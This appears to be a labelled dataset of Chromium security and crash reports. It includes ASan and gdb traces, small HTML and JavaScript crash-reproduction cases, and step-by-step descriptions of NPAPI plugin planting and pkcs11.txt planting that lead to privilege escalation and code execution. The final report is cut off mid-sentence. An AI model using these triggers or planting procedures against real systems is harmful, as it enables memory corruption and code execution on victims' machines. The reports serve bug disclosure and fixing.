37 in main b/build/slave/asan_release__symbolized_/build/chrome/app/chrome_exe_main_gtk.cc:18 38 in libc_start_main build/buildd/eglibc-2.13/csu/libc-start.c:258 15760 aborting stats 4934m malloced 4640m for red zones by 4140976 calls stats 1233m realloced by 412434 calls stats 4920m freed by 4012794 calls stats 4786m really freed by 3912600 calls stats 472m 120922 full pages mmaped in 118 calls mmaps by size class 8:229362 9:32764 10:20475 11:10235 12:7168 13:3072 14:2560 15:2432 16:640 17:192 18:176 19:144 20:4 21:2 22:1 mallocs by size class 8:2740121 9:492788 10:304389 11:217712 12:160087 13:83350 14:61929 15:56939 16:12850 17:3366 18:4178 19:3251 20:8 21:7 22:1 frees by size class 8:2624628 9:488577 10:296331 11:217493 12:159984 13:83307 14:61908 15:56931 16:12831 17:3361 18:4176 19:3251 20:8 21:7 22:1 rfrees by size class 8:2561902 9:477896 10:288054 11:210242 12:154782 13:81114 14:60138 15:55422 16:12534 17:3274 18:4064 19:3164 20:7 21:6 22:1 stats malloc large 10811 small slow 70058 shadow byte and word fb 00 04 fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 04 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 fb fb killed	9
heap-use-after-free in autocompletematch autocompletematch vulnerability details heap-use-after-free happens during address bar autocomplete process version version 20.0.1091.0 130353 ubuntu 10.10 reproduction case ca n't provide any testcase crash happened while trying to append some data in address bar to existing link browser was a little bit frozen while i was trying to type in url for crashes please include the following additional information this is a browser crash with following asan log 5851 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 0 in autocompletematch acmatchclassification std uninitialized_copy false uninitialized_copy gnu_cxx normal_iterator autocompletematch acmatchclassification const std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification autocompletematch acmatchclassification gnu_cxx normal_iterator autocompletematch acmatchclassification const std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification gnu_cxx normal_iterator autocompletematch acmatchclassification const std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification autocompletematch acmatchclassification usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_uninitialized.h:75 1 in std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification vector std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification const usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_vector.h:246 2 in autocompletematch autocompletematch autocompletematch const b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete_match.cc:69 3 in omniboxpopupviewgtk acceptline unsigned long windowopendisposition b/build/slave/asan_release__symbolized_/build/chrome/browser/ui/gtk/omnibox/omnibox_popup_view_gtk.cc:487 4 in omniboxpopupviewgtk handlebuttonrelease gtkwidget gdkeventbutton b/build/slave/asan_release__symbolized_/build/chrome/browser/ui/gtk/omnibox/omnibox_popup_view_gtk.cc:597 5 in omniboxpopupviewgtk handlebuttonreleasethunk gtkwidget gdkeventbutton void b/build/slave/asan_release__symbolized_/build/./chrome/browser/ui/gtk/omnibox/omnibox_popup_view_gtk.h:98 6 in gtk_marshal_boolean__boxed build/buildd/gtk+2.0-2.22.0/gtk/gtkmarshalers.c:90 is located 0 bytes inside of 32-byte region freed by thread t0 here 0 in operator delete void 0 1 in autocompletematch autocompletematch b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete_match.cc:75 2 in void std destroy_aux false destroy autocompletematch autocompletematch autocompletematch usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_construct.h:92 3 in std vector autocompletematch std allocator autocompletematch m_erase_at_end autocompletematch usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_vector.h:1151 4 in autocompleteresult reset b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete.cc:759 5 in autocompletecontroller stop bool b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete.cc:946 6 in omniboxviewgtk handleviewfocusout gtkwidget gdkeventfocus b/build/slave/asan_release__symbolized_/build/chrome/browser/ui/gtk/omnibox/omnibox_view_gtk.cc:1211 7 in omniboxviewgtk handleviewfocusoutthunk gtkwidget gdkeventfocus void b/build/slave/asan_release__symbolized_/build/./chrome/browser/ui/gtk/omnibox/omnibox_view_gtk.h:178 8 in gtk_marshal_boolean__boxed build/buildd/gtk+2.0-2.22.0/gtk/gtkmarshalers.c:90 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in autocompletematch acmatchclassification std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification m_allocate_and_copy gnu_cxx normal_iterator autocompletematch acmatchclassification const std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification unsigned long gnu_cxx normal_iterator autocompletematch acmatchclassification const std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification gnu_cxx normal_iterator autocompletematch acmatchclassification const std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_vector.h:963 2 in std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification operator std vector autocompletematch acmatchclassification std allocator autocompletematch acmatchclassification const usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/vector.tcc:165 3 in autocompletematch operator autocompletematch const b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete_match.cc:91 4 in void std insertion_sort gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch bool autocompletematch const autocompletematch const gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch bool autocompletematch const autocompletematch const usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_algo.h:2131 5 in void std final_insertion_sort gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch bool autocompletematch const autocompletematch const gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch bool autocompletematch const autocompletematch const usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_algo.h:2199 6 in void std sort gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch bool autocompletematch const autocompletematch const gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch gnu_cxx normal_iterator autocompletematch std vector autocompletematch std allocator autocompletematch bool autocompletematch const autocompletematch const usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_algo.h:5262 7 in autocompleteresult sortandcull autocompleteinput const b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete.cc:697 8 in autocompletecontroller updateresult bool b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete.cc:995 9 in autocompletecontroller start std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string unsigned short base string16_char_traits std allocator unsigned short const bool bool bool autocompleteinput matchesrequested b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete.cc:930 10 in autocompleteeditmodel startautocomplete bool bool const b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete_edit.cc:435 11 in omniboxviewgtk updatepopup b/build/slave/asan_release__symbolized_/build/chrome/browser/ui/gtk/omnibox/omnibox_view_gtk.cc:602 12 in autocompleteeditmodel onafterpossiblechange std basic_string unsigned short base string16_char_traits std allocator unsigned short const std basic_string unsigned short base string16_char_traits std allocator unsigned short const unsigned long unsigned long bool bool bool bool b/build/slave/asan_release__symbolized_/build/chrome/browser/autocomplete/autocomplete_edit.cc:880 13 in omniboxviewgtk onafterpossiblechange b/build/slave/asan_release__symbolized_/build/chrome/browser/ui/gtk/omnibox/omnibox_view_gtk.cc:715 14 in omniboxviewgtk handlekeypress gtkwidget gdkeventkey b/build/slave/asan_release__symbolized_/build/chrome/browser/ui/gtk/omnibox/omnibox_view_gtk.cc:1060 15 in gtk_marshal_boolean__boxed build/buildd/gtk+2.0-2.22.0/gtk/gtkmarshalers.c:90 5851 aborting stats 5437m malloced 12622m for red zones by 51749084 calls stats 905m realloced by 2819956 calls stats 5088m freed by 45501300 calls stats 5043m really freed by 44457223 calls stats 2592m 663636 full pages mmaped in 622 calls mmaps by size class 8:7634478 9:450505 10:36855 11:16376 12:12288 13:15872 14:1280 15:384 16:320 17:128 18:64 19:32 20:16 21:14 22:1 23:1 24:1 25:1 26:1 mallocs by size class 8:46158491 9:3857477 10:687523 11:494869 12:422185 13:104464 14:16957 15:5996 16:562 17:352 18:114 19:44 20:24 21:19 22:2 23:1 24:1 25:2 26:1 frees by size class 8:40298715 9:3488357 10:678014 11:493227 12:421632 13:97443 14:16875 15:5963 16:531 17:342 18:109 19:43 20:23 21:19 22:2 23:1 24:1 25:2 26:1 rfrees by size class 8:39260075 9:3485325 10:676156 11:492915 12:421444 13:97430 14:16868 15:5951 16:526 17:337 18:107 19:42 20:22 21:18 22:2 23:1 24:1 25:2 26:1 stats malloc large 560 small slow 142270 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
security msvr:159 google chrome npapi plugin insecure loading elevation of privilege vulnerability the following software vulnerability report is highly confidential and should be limited in distribution to members of the engineering team within your organization with need-to-know for performance of security risk analysis and remediation please do not distribute outside of your organization the attached research report is likewise highly confidential and its existence and contents should not be discussed outside of your organization s security team and the report itself limited in distribution to those individuals with need-to-know clearance for legal and business continuity reasons to ensure consistency and to limit the circle of knowledge about this vulnerability we ask you to please direct all communications through msvr microsoft.com and not to the individual finder or other contacts please acknowledge this report via email to msvr microsoft.com msvr case 159 title google chrome npapi plugin insecure loading elevation of privilege vulnerability version tested google chrome 17.0.963.79 on windows impact elevation of privilege finder/credit haifei li at microsoft and microsoft vulnerability research msvr cve pending summary an elevation of privilege vulnerability exists in google chrome due to the insecure loading of npapi plugins on chrome an attacker who successfully exploited this vulnerability could run arbitrary code with elevated privileges technical details when chrome is being started it searches in the following directories on every hard drive trying to find a npapi plugin which is named like np dll x pfiles\plugins\np dll following is the behavior caught by file monitor tools d pfiles\plugins no such file filebothdirectoryinformation np dll normally chrome will be installed in the current-user s private directory by default it s c users\administrator\appdata\local\google\chrome it s good for keeping the system safe since the low-privilege user would not be able to access the high-privilege user s private directory however the good-security feature will be broke by the npapi plugin searching behavior discussed above the low-privilege user could create such a plugin on the system and wait for the high-privilege user to use chrome if some certain conditions are matched the low-privilege user could gain the same privilege as the high-privilege user following we are going to discuss details regarding the certain conditions at the beginning when chrome is being started it tries to find npapi plugins in these directories x pfiles\plugins at this time it wo n't load them as executable windows libraries instead it tries to find the registered mime-type which is stored in the resource version in the pe file if the found mime-type has n't been registered in any other plugins before chrome will use this plugin for handling future such mime-type contents so let s say if we registered a mime application/x-helloworld in d pfiles\plugins\npchromeplugin.dll in future when chrome encounters application/x-helloworld contents it will load the npchromeplugin.dll at this time the malicious code in npchromeplugin.dll will be executed directly with the same privilege as the current user please note that chrome does n't sandbox npapi plugins which will make the elevation of privilege performed directly for more information regarding npapi plugin and google chrome as well as how to develop a npapi plugin please refer to the following pages please note that the attacker could register a or many more-commonly-used mime-type s which will make the attack more easily the application/x-helloworld discussed here is just an example how to reproduce we use windows server 2008 to show the elevation of privilege more clearly 1 on windows server 2008 create another standard user 2 log-in as the administrator install google chrome 3 log-in as the standard user create a directory like x pfiles\plugins and put the attached file npchromeplugin.dll into that directory you may create c pfiles\plugins d pfiles\plugins or e pfiles\plugins 4 log-in as the administrator use chrome to access the attached file npapi_plugin_trigger.html which could be hosted on a web server or you can configure your web server in order to make it return application/x-helloworld contents you may access the url like application/x-helloworld embedded on a web page accessing a file being returned as application/x-helloworld content you will see calc.exe is executed finally you may find that the calc.exe process has the same privilege as the current user administrator proof of concept directions poc has password ms_google if you have any questions or concerns please contact us via email at msvr microsoft.com in addition please acknowledge the receipt of this report	2
gpu process crash below dodrawarrays nvidia vulnerability details opening the attached page causes a gpu process crash a crash like this seems to be happening in every version from stable to current unstable but the same repros do n't seem to work for all versions the attached partially minimized testcase works at least against which happened to be the latest version last time i checked the crash happens in normal and asan builds version chrome version chromium 19.0.1074.0 developer build 127410 operating system linux debian 6.0.4 x86_64 gl_version 4.2.0 nvidia 295.20 reproduction case 1 download both files nothing wrong with canvasmatrix.js 2 chrome-asan unknown-2.html 3 gpu process crashes for crashes please include the following additional information type of crash gpu crash state program received signal sigsegv segmentation fault in gdb bt 0 in 1 in 2 in 3 in 4 in 5 in from usr/lib/libnvidia-glcore.so.295.20 6 in from usr/lib/libnvidia-glcore.so.295.20 7 in gpu gles2 gles2decoderimpl dodrawarrays this optimized out instanced optimized out mode optimized out first optimized out count optimized out primcount optimized out at gpu/command_buffer/service/gles2_cmd_decoder.cc:5229 8 in gpu gles2 gles2decoderimpl docommand this optimized out command optimized out arg_count error reading variable unhandled dwarf expression opcode cmd_data optimized out at gpu/command_buffer/service/gles2_cmd_decoder.cc:3112 9 in gpu commandparser processcommand this optimized out at gpu/command_buffer/service/cmd_parser.cc:62 10 in gpu gpuscheduler putchanged this error reading variable unhandled dwarf expression opcode at gpu/command_buffer/service/gpu_scheduler.cc:69 11 in base internal invokehelper false void base internal runnableadapter void gpu gpuscheduler void gpu gpuscheduler makeitso base internal runnableadapter void gpu gpuscheduler gpu gpuscheduler a1 optimized out runnable at base/bind_internal.h:868 12 in base internal invoker 1 base internal bindstate base internal runnableadapter void gpu gpuscheduler void gpu gpuscheduler void base internal unretainedwrapper gpu gpuscheduler void gpu gpuscheduler run base internal bindstatebase base optimized out at base/bind_internal.h:1170 13 in gpucommandbufferstub onasyncflush this optimized out put_offset optimized out flush_count optimized out at content/common/gpu/gpu_command_buffer_stub.cc:429 14 in gpucommandbuffermsg_asyncflush dispatch gpucommandbufferstub gpucommandbufferstub void gpucommandbufferstub int unsigned int msg error reading variable unhandled dwarf expression opcode obj error reading variable unhandled dwarf expression opcode sender optimized out func at content/common/gpu/gpu_messages.h:366 15 in gpucommandbufferstub onmessagereceived this optimized out message at content/common/gpu/gpu_command_buffer_stub.cc:110 16 in non-virtual thunk to gpucommandbufferstub onmessagereceived ipc message const 17 in messagerouter routemessage this optimized out msg error reading variable dwarf-2 expression error dw_op_reg operations must be used either alone or in conjunction with dw_op_piece or dw_op_bit_piece at content/common/message_router.cc:46 18 in gpuchannel handlemessage this optimized out at content/common/gpu/gpu_channel.cc:250 19 in base internal invokehelper true void base internal runnableadapter void gpuchannel void base weakptr gpuchannel const makeitso base internal runnableadapter void gpuchannel base weakptr gpuchannel const a1 runnable at base/bind_internal.h:880 20 in messageloop runtask this optimized out pending_task at base/message_loop.cc:458 21 in messageloop deferorrunpendingtask this error reading variable unhandled dwarf expression opcode pending_task error reading variable unhandled dwarf expression opcode at base/message_loop.cc:470 22 in messageloop dowork this optimized out at base/message_loop.cc:660 23 in base messagepumpglib runwithdispatcher this optimized out delegate error reading variable unhandled dwarf expression opcode dispatcher error reading variable dwarf-2 expression error dw_op_reg operations must be used either alone or in conjunction with dw_op_piece or dw_op_bit_piece at base/message_pump_glib.cc:210 24 in messageloop runinternal this optimized out at base/message_loop.cc:417 25 in messageloop run this optimized out at base/message_loop.cc:300 26 in gpumain parameters at content/gpu/gpu_main.cc:132 27 in anonymous namespace runnamedprocesstypemain process_type error reading variable unhandled dwarf expression opcode main_function_params delegate optimized out at content/app/content_main_runner.cc:282 28 in anonymous namespace contentmainrunnerimpl run this optimized out at content/app/content_main_runner.cc:511 29 in content contentmain argc optimized out argv optimized out delegate optimized out at content/app/content_main.cc:35 30 in chromemain argc optimized out argv error reading variable unhandled dwarf expression opcode at chrome/app/chrome_main.cc:32 31 in main argc=4837440 argv at chrome/app/chrome_exe_main_gtk.cc:18 gdb p rsi 1 139804545867784 gdb x/10i rip-20 mov rsi rsi mov rsi rsi mov rcx rdi shl rdi add rdi rsi mov rsi edi mov rsi ebp mov edi rax mov ebp rax add rax gdb i r rax 139804407469664 rbx 1085763584 rcx 302340 rdx 1264386 rsi 139804545867784 rdi 4837440 rbp rsp r8 139804856287360 r9 1048576 r10 0 r11 0 r12 1566726 r13 139804856829432 r14 0 r15 0 rip eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0	11
security libxml2 1-byte heap-buffer-overflow in xmlxptrevalxptrpart vulnerability details here is some code from xmlxptrevalxptrpart at xpointer.c len xmlstrlen ctxt cur len buffer xmlchar xmlmallocatomic len sizeof xmlchar if buffer null xmlxptrerrmemory allocating buffer return cur buffer while cur 0 if cur level if level 0 next break cur cur else if cur level cur cur else if cur next if cur cur cur cur cur else cur cur cur else cur cur next printf before 08x\n unsigned cur cur 0 printf after 08x\n unsigned cur i added the two printf s for debugging overflow occurs when ctxt cur string ends with for example if ctxt cur is aaaaaaaaaaaaaa then 1 len 15 1 16 2 16 byte buffer is allocated 3 14 a chars are copied 4 and x00 are copied together 5 cur 0 will overflow with tcmalloc if the 16-byte block after buffer is not in use its first bytes are a pointer to the next free block low byte of this pointer is overwritten to version chrome version 18.0.969.0 developer build 113953 linux operating system ubuntu 10.04.3 lts i686 reproduction case open asd/xslt/bad.xml i usually also have to force chrome to use more heap by moving mouse or clicking it might take some tries it prints out before=b95bee20 after=b95bee00 third_party/tcmalloc/chromium/src/free_list.cc:115 memory corruption detected so a pointer to next free block is corrupted and tcmalloc detects the corruption i do n't think it would be too difficult to corrupt arbitrary memory but i m not sure have n't tried	7
heap-use-after-free in webcore rendertext removetextbox vulnerability details use-after-free in webcore rendertext removetextbox version chrome version stable beta dev chromium 19.0.1085.0 developer build 129583 os linux webkit 536.5 112458 operating system 64bit linux reproduction case html head style el0 webkit-column-count:2 display table-cell el0 first-letter background-size auto el1 float right style script onload function el0=document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement div el1.setattribute id el1 el0.appendchild el1 el0.appendchild document.createtextnode unescape u3200a document.designmode='on window.getselection setbaseandextent el1 0 el1 0 document.execcommand insertlinebreak document.execcommand selectall document.execcommand strikethrough document.execcommand formatblock false pre script head body body html for crashes please include the following additional information type of crash renderer asan crash state 32492 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore rendertext removetextbox webcore inlinetextbox 0 1 in webcore inlinetextbox deleteline webcore renderarena 0 2 in webcore inlineflowbox deleteline webcore renderarena 0 is located 64 bytes inside of 96-byte region freed by thread t0 here 0 in free 0 1 in webcore renderblock createfirstletterrenderer webcore renderobject webcore renderobject 0 2 in webcore renderblock updatefirstletter 0 3 in webcore renderblock layout 0	11
chrome crash report socketstreamdispatcherhost cancelsslrequest is this related to product version chrome 20.0.1095.0 stack signature anonymous namespace invalidparameter wchar_t const wchar_t const wchar_t const unsigned int unsigned int 19d42d7 new stack signature anonymous namespace invalidparameter wchar_t const wchar_t const wchar_t const unsigned int unsigned int 9416aada_ff81ebd6_59bfe60c_e79af043_807d9fa5 report time utc 2012/04/09 13:14:15 mon uptime 1697515 ms os name version windows nt 5.1.2600 service pack 3 cpu architecture info x86 authenticamd family 16 model 2 stepping 3 channel canary plat win32 ptype browser thread 11 crashed exception_breakpoint chrome.dll startup_helper_win.cc:24 anonymous namespace invalidparameter wchar_t const wchar_t const wchar_t const unsigned int unsigned int chrome.dll invarg.c:125 invalid_parameter_noinfo chrome.dll vector:768 std vector stdext hash stdext hmap_traits int ppapi ppb_tcpserversocket_shared stdext hash_compare int std less int std allocator std pair int const ppapi ppb_tcpserversocket_shared 0 list_position std allocator stdext hash stdext hmap_traits int ppapi ppb_tcpserversocket_shared stdext hash_compare int std less int std allocator std pair int const ppapi ppb_tcpserversocket_shared 0 list_position operator unsigned int chrome.dll xhash:651 stdext hash stdext hmap_traits int quotadispatcher callback stdext hash_compare int std less int std allocator std pair int const quotadispatcher callback 0 lower_bound int const chrome.dll id_map.h:103 idmap ipcwebsocketstreamhandlebridge,0 lookup int chrome.dll socket_stream_dispatcher_host.cc:152 socketstreamdispatcherhost cancelsslrequest content globalrequestid const int net sslinfo const chrome.dll ssl_error_handler.cc:137 sslerrorhandler completecancelrequest int chrome.dll bind_internal.h:1254 base internal invoker 2 base internal bindstate base internal runnableadapter void mediastreamimpl base waitableevent void mediastreamimpl base waitableevent void mediastreamimpl base waitableevent void mediastreamimpl base waitableevent run base internal bindstatebase chrome.dll message_loop.cc:458 messageloop runtask base pendingtask const chrome.dll message_loop.cc:647 messageloop dowork chrome.dll message_pump_win.cc:477 base messagepumpforio dorunloop chrome.dll message_pump_win.h:64 base messagepumpwin run base messagepump delegate chrome.dll message_loop.cc:390 messageloop runhandler chrome.dll message_loop.cc:300 messageloop run chrome.dll thread.cc:126 base thread run messageloop chrome.dll thread.cc:161 base thread threadmain chrome.dll platform_thread_win.cc:58 base anonymous namespace threadfunc void kernel32.dll basethreadstart	11
chrome crash report stack signature webcore npobjectnamedgetter webcore v8htm japhet can you please provide some insights on this bug thanks product chrome stack signature 1812e17 new signature label webcore npobjectnamedgetter webcore v8htmlobjectelement new signature hash ff5961b6_66e5d032_0876bca3_ae593c1e_96f83eb1 report link meta information product name chrome product version 20.0.1113.0 report id 57e276c71b177cfd report time 2012/04/22 15:56:01 sun uptime 4945 sec cumulative uptime 0 sec os name windows nt os version 6.1.7601 service pack 1 cpu architecture x86 cpu info genuineintel family 6 model 15 stepping 11 ptype renderer thread 0 crashed exception_access_violation_write v8htmlpluginelementcustom.cpp:59 webcore npobjectnamedgetter webcore v8htmlobjectelement v8htmlpluginelementcustom.cpp:92 webcore v8htmlembedelement namedpropertygetter v8 local v8 string v8 accessorinfo const objects.cc:3166 v8 internal jsobject getpropertyattributewithinterceptor v8 internal jsobject v8 internal string bool objects.cc:3217 v8 internal jsreceiver getpropertyattribute v8 internal jsreceiver v8 internal lookupresult v8 internal string bool objects.cc:3187 v8 internal jsreceiver getpropertyattributewithreceiver v8 internal jsreceiver v8 internal string objects-inl.h:4520 v8 internal jsreceiver hasproperty v8 internal string runtime.cc:4803 v8 internal runtime_hasproperty v8 internal arguments v8 internal isolate execution.cc:118 v8 internal invoke execution.cc:173 v8 internal execution call v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object const bool bool api.cc:3622 v8 function call v8 handle v8 object int v8 handle v8 value const v8proxy.cpp:437 webcore v8proxy instrumentedcallfunction webcore frame v8 handle v8 function v8 handle v8 object int v8 handle v8 value const v8proxy.cpp:407 webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value const v8eventlistener.cpp:85 webcore v8eventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event v8abstracteventlistener.cpp:160 webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value v8abstracteventlistener.cpp:105 webcore v8abstracteventlistener handleevent webcore scriptexecutioncontext webcore event eventtarget.cpp:231 webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener,1 eventtarget.cpp:198 webcore eventtarget fireeventlisteners webcore event node.cpp:2730 webcore node handlelocalevents webcore event eventdispatcher.cpp:296 webcore eventdispatcher dispatchevent wtf passrefptr webcore event uievent.cpp:144 webcore focuseventdispatchmediator dispatchevent webcore eventdispatcher 13 stack frames dropped child_thread.cc:203 childthread onmessagereceived ipc message const ipc_channel_proxy.cc:269 ipc channelproxy context ondispatchmessage ipc message const bind_internal.h:1254 base internal invoker 2 base internal bindstate base internal runnableadapter void extensions settingsfrontend backendwrapper base callback void extensions settingsbackend const void extensions settingsfrontend backendwrapper base callback void extensions settingsbackend const void extensions settingsfrontend backendwrapper base callback void extensions settingsbackend void extensions settingsfrontend backendwrapper base callback void extensions settingsbackend const run base internal bindstatebase message_loop.cc:458 messageloop runtask base pendingtask const message_loop.cc:647 messageloop dowork message_pump_default.cc:55 base messagepumpdefault run base messagepump delegate message_loop.cc:390 messageloop runhandler message_loop.cc:300 messageloop run renderer_main.cc:266 renderermain content mainfunctionparams const content_main_runner.cc:284 anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate content_main_runner.cc:524 anonymous namespace contentmainrunnerimpl run content_main.cc:35 content contentmain hinstance sandbox sandboxinterfaceinfo content contentmaindelegate chrome_main.cc:28 chromemain client_util.cc:423 maindllloader launch hinstance sandbox sandboxinterfaceinfo chrome_exe_main_win.cc:31 runchrome hinstance chrome_exe_main_win.cc:47 wwinmain crt0.c:263 tmaincrtstartup basethreadinitthunk rtluserthreadstart	11
chrome chrashes when pressing back button on a page that is still downloading a big gif image chrome version 18.0.1025.162 revision 131933 m os version 6.1 windows 7 pro 64bit urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 ok firefox 4.x ok ie 7/8/9 ok what steps will reproduce the problem 1 open 2 click on the first item that navigates to 3 before the image has finished downloading about 0.5 seconds after the layout gets displayed press back button sometimes it takes a few tries with back-click-back-click but essentially always reproducible what is the expected result chrome navigates back successfully and then continues working normally what happens instead chrome chrashes with c runtime error this application has requested the runtime to terminate in an unusual way please provide any additional information below attach a screenshot if possible	11
security browser crash document.createevent mouseevents initmouseevent in background tab vulnerability details what steps will reproduce the problem 1 create a page which causes the crash i ve attached one with further explenation in the code cause-crash.html 1 open a page with a html link to the crash causing page attached link.html and link-iframe.html 2 open the link in a new tab stay on the current page link.html or link-iframe.html and wait until the crash causing page was loaded what is the expected result the tab in the background should load normaly what happens instead if the current page has got any iframe in it ex link-iframe.html the browser will crash directly if the current page has not got any iframe in it ex link.html the user has to selects on of the options from the select element which is now shown on the active page by the page in the background if the current page has not got an iframe in it but the browser crashs directly then the page had an iframe in it before and the chache was n't cleared important even if you ca n't find the iframe by using inspect element this will be the reason version chrome version 18.0.1025.168 stable operating system linux ubuntu 12.04 stable reproduction case attached crash-causing.html link.html link-iframe.html for crashes please include the following additional information type of crash browser crash state unknown i use google chrome dpkg l grep chromium has got no output so chromium-browser does n't exists no explenation was given for linux in this case on client id if relevant 9c0b285a82df862c	11
langfuzz crash on heap with invalid read from random address 32 bit vulnerability details the javascript code below crashes chrome 19 and likely 20 as well as d8 trunk rev 11517 on heap with an invalid read to a strange address the address is not fixed i have multiple tests that crash at different addresses so i assume it can be controlled somehow the issue seems to affect 32 bit only version chrome version 19.0.1084.15 dev operating system ubuntu 11.04 32 bit i tested this on d8 trunk chrome 20 as well and it reproduces but i did not have a machine with chrome 20 and 32 bit handy for testing in addition to chrome 19 reproduction case assertequals 1 eval 1 1 function assertequals assertequals return arguments assertequals const smi_max 1 29 1 1 29 const smi_min smi_max 1 function sar1 x assertequals 536870912 sar1 smi_min for crashes please include the following additional information type of crash tab crash state program received signal sigsegv segmentation fault in gdb bt 8 0 in 1 in 2 in 3 in 4 in 5 in backtrace stopped previous frame inner to this frame corrupt stack gdb x i pc mov ebx eax,2 ecx gdb info reg ebx eax ecx ebx 1433673233 eax 1073741824 ecx 2 gdb valgrind trace in d8 18760 invalid read of size 4 18760 at 18760 by 18760 by 18760 by 18760 by 18760 by v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool in scratch/holler/langfuzz/v8-trunk/d8 18760 address is not stack d malloc d or recently free d	11
regression 82144 oob inlineiterator read in trailingobjects updatemidpointsfortrailingboxes vulnerability details read of size 4 at thread t0 0 in webcore trailingobjects updatemidpointsfortrailingboxes webcore midpointstate webcore inlineiterator is located 8 bytes to the left of 384-byte region version chrome version stable trunk operating system linux 64bit reproduction case attached	11
security pkcs11.txt file planting leads to remote code execution outside sandbox vulnerability details apparently on windows systems chrome browser will try to load a driver for a pkcs11 device from a location instructed by pkcs11.txt configuration file located on root path derived from the current working directory upon its first connection to an https page attacker s web site can trick the user by providing simple instructions to open a remote share/webdav of her choice in a file browse dialog e.g open or save as doing so will set the current working directory of the main parent chrome process to the remote attacker-controlled shared folder where pkcs11.txt and malicious.lib files reside the current working directory is set there for as long as the file browse dialog displays the remote folder assuming chrome has not navigated to an https page before an https request issued while the remote shared folder is displayed to the user in the file browse dialog will cause crome to load file pkcs11.txt from this very folder parse it and due to the library=malicious.lib command in it load and execute malicious.lib dll from the same location its code gets executed outside the chrome sandbox because of the first https connection requirement this attack ca n't work if user s default search engine is google as this triggers an https connection upon chrome startup which results in an attempt to load pkcs11.txt from c in contrast to the demo below in a real attack the triggering of an https request would not be implemented with a time delay instead the attacker-controlled server hosting the remote shared folder would be able to determine from incoming requests that the user has opened the shared folder and would signal to the script running in user s chrome that it should initiate an https request in an alternative scenario the user would have his downloads folder located on a root of any drive either hard drive or usb thumbdrive e.g e but not e downloads or in a root of a remote shared folder e.g server\downloads but not server\sharename\downloads in this arguably unusual configuration the attack could be mounted like this the requirements are the same as in the above demo plus the downloads folder is set to server\downloads 1 the user visits a malicious web page with chrome 2 the malicious web page silently downloads pkcs11.txt to the server\downloads folder 3 the user tries to save an arbitrary file using right-click save as 4 a timer script triggers loading of an https page while the save as dialog is still open 5 malicious.lib gets downloaded and executed from a remote attacker controlled shared folder as instructed by pkcs11.txt in this case instead of the open dialog the save-as dialog is used which also sets the current working directory to the location currently displayed by default this is the location of the downloads folder which in this case is a root location this means that chrome will load server\downloads\pkcs11.txt and 